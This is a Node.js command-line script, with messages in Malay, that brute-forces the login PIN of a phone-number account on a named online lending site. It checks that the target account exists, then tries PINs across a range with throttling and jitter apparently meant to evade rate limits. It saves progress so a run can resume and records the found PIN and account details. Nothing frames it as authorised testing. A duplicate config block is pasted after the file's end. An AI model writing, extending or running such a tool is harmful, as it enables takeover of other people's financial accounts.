#!/usr/bin/env node
import { readFileSync } from 'node:fs';
import { setTimeout as sleep } from 'node:timers/promises';
import { PinjamTokClient } from './api.js';
import { buildPins, shufflePins, runBrute, fmt, classify } from './brute.js';
import { loadJson, saveJson, clearFile } from './state.js';
import { log } from './logger.js';

const CONFIG_PATH = 'config.json';
const STATE_PATH = 'progress.json';
const FOUND_PATH = 'found.json';

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (!a.startsWith('--')) continue;
    const key = a.slice(2);
    if (['resume', 'shuffle', 'check-only', 'encrypt', 'stop-on-unknown'].includes(key)) {
      out[key] = true;
      continue;
    }
    const val = argv[i + 1];
    if (val === undefined || val.startsWith('--')) continue;
    out[key] = val;
    i++;
  }
  return out;
}

const DEFAULTS = {
  baseUrl: 'https://www.pinjamtok.asia',
  dialCode: '60',
  concurrency: 2,
  delayMs: 400,
  jitterMs: 200,
  maxRetries: 3,
};

function buildConfig(args) {
  let cfg = null;
  try {
    cfg = JSON.parse(readFileSync(CONFIG_PATH, 'utf8'));
  } catch (err) {
    if (err.code !== 'ENOENT') {
      throw new Error(`config.json rosak: ${err.message}`);
    }
  }
  if (!cfg) {
    cfg = loadJson('config.example.json', null);
    if (!cfg) throw new Error('config.json / config.example.json tidak dijumpai');
    log.warn('config.json tiada — guna config.example.json sebagai asas');
  }

  cfg = { ...DEFAULTS, ...cfg };

  if (args.phone) cfg.mobileNo = args.phone;
  if (args.mobile) cfg.mobileNo = args.mobile;
  if (args['dial-code']) cfg.dialCode = args['dial-code'];
  if (args.adv) cfg.advCode = args.adv;
  if (args.referral) cfg.referralCode = args.referral;
  if (args.start) cfg.start = args.start;
  if (args.end) cfg.end = args.end;
  if (args.concurrency) cfg.concurrency = Number(args.concurrency);
  if (args.delay) cfg.delayMs = Number(args.delay);
  if (args.jitter) cfg.jitterMs = Number(args.jitter);
  if (args.base) cfg.baseUrl = args.base;
  if (args['max-retries']) cfg.maxRetries = Number(args['max-retries']);
  if (args.encrypt) cfg.encrypt = true;
  if (args.shuffle) cfg.shuffle = true;
  if (args['stop-on-unknown']) cfg.stopOnUnknown = true;

  const base = String(cfg.baseUrl || cfg.baseURL || '').trim();
  if (!base) throw new Error('baseUrl kosong — isi dalam config.json');
  cfg.baseUrl = (/^https?:\/\//i.test(base) ? base : `https://${base}`).replace(/\/+$/, '');

  return cfg;
}

function normalisePhone(cfg) {
  let n = String(cfg.mobileNo ?? '').replace(/\D/g, '');
  const dial = String(cfg.dialCode ?? '').replace(/\D/g, '');
  if (dial && n.startsWith(dial) && n.length > dial.length) n = n.slice(dial.length);
  if (!n) throw new Error('Nombor telefon kosong. Isi mobileNo dalam config.json atau --phone');
  if (n.length < 7 || n.length > 11) throw new Error(`Panjang nombor telefon pelik: ${n.length} digit`);
  cfg.mobileNo = n;
  cfg.dialCode = dial || '60';
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const cfg = buildConfig(args);
  normalisePhone(cfg);

  const client = new PinjamTokClient(cfg);

  log.info(`sasaran : ${cfg.baseUrl}/api/auth/mobile-login`);
  log.info(`akaun   : +${cfg.dialCode}${cfg.mobileNo}`);

  const check = await client.verifyAccount();
  const info = check.json?.data ?? {};
  if (check.json?.status !== true) {
    throw new Error(`verify-password gagal: ${JSON.stringify(check.json).slice(0, 300)}`);
  }
  log.info(`akaun   : wujud=${info.customer_exists} ada_pin=${info.has_password}`);
  if (!info.customer_exists) throw new Error('Akaun tidak wujud — daftar dahulu di laman web');
  if (!info.has_password) throw new Error('Akaun belum ada PIN — guna aliran set PIN');

  if (args['check-only']) {
    log.info('mod semak sahaja — selesai');
    return;
  }

  let state = { nextIndex: 0, attempts: 0, startedAt: new Date().toISOString() };
  if (args.resume) {
    const prev = loadJson(STATE_PATH, null);
    if (!prev) log.warn('tiada progress.json — mula dari awal');
    else {
      state = { ...prev, nextIndex: prev.nextIndex ?? 0, attempts: prev.attempts ?? 0 };
      log.info(`resume dari indeks ${state.nextIndex} (${state.attempts} percubaan terkumpul)`);
    }
  } else {
    clearFile(STATE_PATH);
    clearFile(FOUND_PATH);
  }

  let pins = buildPins(cfg.start, cfg.end);
  if (cfg.shuffle) {
    pins = shufflePins(pins, args.seed ? Number(args.seed) : undefined);
    log.info('mod shuffle aktif — progress tidak boleh disambung merentas jadual berbeza');
  }
  if (state.nextIndex >= pins.length) {
    log.info('julat sudah habis — tiada apa untuk dicuba');
    return;
  }

  log.info(`julat   : ${cfg.start} → ${cfg.end} (${pins.length} PIN)`);
  log.info(`kadar   : concurrency ${cfg.concurrency}, delay ${cfg.delayMs}ms + jitter ${cfg.jitterMs}ms`);
  log.info(`anggaran: ${fmt(pins.length / Math.max(cfg.concurrency / ((cfg.delayMs + cfg.jitterMs / 2) / 1000), 0.5))}`);

  let lastSave = 0;
  const saver = setInterval(() => {
    const now = Date.now();
    if (now - lastSave < 5000) return;
    lastSave = now;
    saveJson(STATE_PATH, { ...state, updatedAt: new Date().toISOString(), config: cfg });
  }, 2000);

  let result = null;
  const shutdown = async () => {
    clearInterval(saver);
    saveJson(STATE_PATH, { ...state, updatedAt: new Date().toISOString(), config: cfg });
    log.warn(`dihentikan — progress disimpan pada indeks ${state.nextIndex}. Sambung dengan: npm run resume`);
    process.exit(130);
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  try {
    result = await runBrute({
      client,
      pins,
      cfg,
      state,
      onFound: (hit) => {
        saveJson(FOUND_PATH, { ...hit, phone: `${cfg.dialCode}${cfg.mobileNo}` });
        log.info('==================================');
        log.info(`PIN DIJUMPAI: ${hit.pin}`);
        log.info('==================================');
      },
    });
  } finally {
    clearInterval(saver);
    saveJson(STATE_PATH, { ...state, updatedAt: new Date().toISOString(), config: cfg });
  }

  if (result?.found) {
    log.info(`selesai dalam ${fmt(result.elapsedMs / 1000)} selepas ${state.attempts} percubaan`);
    log.info(`butiran akaun disimpan dalam ${FOUND_PATH}`);
    process.exit(0);
  }

  log.warn(`tiada PIN dijumpai dalam julat ${cfg.start}–${cfg.end} (${state.attempts} percubaan)`);
  process.exit(2);
}

main().catch((err) => {
  log.error(err.message);
  process.exit(1);
});


const DEFAULTS = {
  baseUrl: 'https://www.pinjamtok.asia',
  dialCode: '60',
  concurrency: 2,
  delayMs: 400,
  jitterMs: 200,
  maxRetries: 3,
};
